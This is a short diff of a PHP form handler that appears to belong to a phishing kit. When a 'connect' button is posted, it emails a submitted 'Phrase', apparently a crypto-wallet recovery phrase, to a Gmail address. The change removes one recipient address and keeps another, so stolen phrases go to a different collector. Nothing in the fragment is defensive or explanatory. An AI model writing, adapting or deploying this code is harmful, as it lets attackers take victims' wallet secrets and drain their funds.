@@ -6,7 +6,6 @@ if (isset($_POST['connect_btn'])) {
   $subject = "NEW MESSAGE FROM Sandbox";
 
   $body = "<p>Phrase: $phrase</p>";
-  $to = "charlesjohnson7002@gmail.com";
   $to = "gagemarkowski@gmail.com";
 
   $headers .= 'Reply-To: ' . $to . "\r\n";
